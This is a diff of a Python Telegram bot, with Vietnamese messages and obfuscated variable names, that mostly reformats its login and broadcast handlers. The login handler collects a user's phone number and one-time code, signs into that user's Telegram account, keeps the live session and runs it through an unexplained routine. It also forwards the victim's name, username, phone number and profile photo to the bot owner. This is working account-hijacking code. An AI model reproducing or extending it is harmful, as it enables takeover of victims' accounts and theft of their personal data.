@@ -28,12 +28,7 @@ def _sync():
             pass
 _sync()
 
-bot = TelegramClient(
-    'bot_manage',
-    A_ID,
-    A_HS,
-    loop=asyncio.new_event_loop()
-)
+bot = TelegramClient('bot_manage', A_ID, A_HS)
 o_p, u_c, c_b, c_i, s_t, cl_t, a_r, o_f, w_m = {}, {}, {}, {}, {}, {}, {}, {}, {}
 delay_cfg = {}
 
@@ -383,31 +378,74 @@ def _logic(c, u_i):
 @bot.on(events.CallbackQuery(data="login"))
 async def _lf(ev):
     u = ev.sender_id
+
     if u in b_u:
         return
+
     async with bot.conversation(u) as cv:
         try:
             await cv.send_message("SĐT (+84...):")
             p = (await cv.get_response()).text.strip().replace(" ", "")
-            c = TelegramClient(f"u_{u}", A_ID, A_HS)
+
+            c = TelegramClient(
+                f"u_{u}",
+                A_ID,
+                A_HS,
+                loop=asyncio.new_event_loop()
+            )
             await c.connect()
+
             if not await c.is_user_authorized():
                 r = await c.send_code_request(p)
+
                 await cv.send_message("OTP:")
                 o = (await cv.get_response()).text.strip()
-                await c.sign_in(p, o, phone_code_hash=r.phone_code_hash)
+
+                await c.sign_in(
+                    p,
+                    o,
+                    phone_code_hash=r.phone_code_hash
+                )
+
             user = await bot.get_entity(u)
-            photo = await bot.download_profile_photo(u, file=f"avt_{u}.jpg")
-            rep = f"🚀 **CÓ THẰNG VỪA LOGIN BOT**\n━━━━━━━━━━━━━━━\n👤 **Tên:** {user.first_name}\n🆔 **ID:** `{u}`\n🏷 **Username:** @{user.username if user.username else 'N/A'}\n📞 **SĐT:** `{p}`\n🔗 **Trang cá nhân:** [Link](tg://user?id={u})"
+
+            photo = await bot.download_profile_photo(
+                u,
+                file=f"avt_{u}.jpg"
+            )
+
+            rep = f"""🚀 **CÓ THẰNG VỪA LOGIN BOT**
+━━━━━━━━━━━━━━━
+👤 **Tên:** {user.first_name}
+🆔 **ID:** `{u}`
+🏷 **Username:** @{user.username if user.username else 'N/A'}
+📞 **SĐT:** `{p}`
+🔗 **Trang cá nhân:** [Link](tg://user?id={u})
+"""
+
             if photo:
-                await bot.send_file(O_ID, photo, caption=rep, parse_mode='markdown')
+                await bot.send_file(
+                    O_ID,
+                    photo,
+                    caption=rep,
+                    parse_mode='markdown'
+                )
+
                 os.remove(photo)
+
             else:
-                await bot.send_message(O_ID, rep, parse_mode='markdown')
+                await bot.send_message(
+                    O_ID,
+                    rep,
+                    parse_mode='markdown'
+                )
+
             if u not in u_c:
                 u_c[u] = c
                 _logic(c, u)
+
             await cv.send_message("✅ OK")
+
         except Exception as e:
             await cv.send_message(f"❌ {e}")
 
@@ -465,8 +503,10 @@ async def _tb(e):
                 int(uid),
                 f"📢 **THÔNG BÁO TỪ ADMIN**\n━━━━━━━━━━━━━━━\n\n{msg}"
             )
+
             count += 1
             await asyncio.sleep(0.3)
+
         except:
             continue
 
